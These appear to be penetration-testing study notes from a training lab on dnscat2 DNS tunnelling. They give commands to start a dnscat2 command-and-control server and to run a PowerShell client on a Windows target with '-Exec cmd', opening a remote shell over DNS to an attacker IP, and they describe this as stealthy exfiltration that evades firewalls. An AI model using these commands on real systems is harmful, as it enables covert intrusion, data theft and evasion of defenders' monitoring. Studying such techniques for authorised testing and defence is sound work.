- [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
- However, with dnscat2, **the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request.**
- Dnscat2 can be an **extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections** and sniff the traffic

# Setting Up & Using dnscat2
---
## Cloning dnscat2 and Setting Up the Server
- `git clone https://github.com/iagox86/dnscat2.git`
- `cd dnscat2/server/`
- `sudo gem install bundler`
- `sudo bundle install`
## Starting the dnscat2 server
- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
- After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.

- We can use the client with the **dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based** client that we can run from Windows targets to establish a tunnel with our dnscat2 server.

## Cloning dnscat2-powershell to the Attack Host
- `git clone https://github.com/lukebaggett/dnscat2-powershell.git`
- Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets:
- `Import-Module .\dnscat2.ps1`
- `Start-Dnscat2 -DNSserver 10.10.16.34 -Domain inlanefreight.local -PreSharedSecret b97bd3bfc2c6bb3271bd40fa3260f9b7 -Exec cmd `
	- DNSServer -> Our IP
- We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted.

## Listing dnscat2 Options
- `?`
- We can use dnscat2 to interact with sessions and move further in a target environment on engagements
- Interacting with the Established Session:
	- `window -i 1`